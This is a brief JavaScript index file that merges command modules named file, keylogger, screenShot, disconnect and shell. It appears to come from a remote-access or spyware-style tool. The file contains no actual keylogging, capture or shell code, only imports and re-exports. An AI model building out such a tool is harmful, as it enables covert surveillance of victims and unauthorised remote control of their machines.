import file from './file'
import keylogger from './keylogger'
import screenShot from './screenShot'
import disconnect from './disconnect'
import shell from './shell'

export default {
  ...file,
  ...keylogger,
  ...screenShot,
  ...disconnect,
  ...shell
}
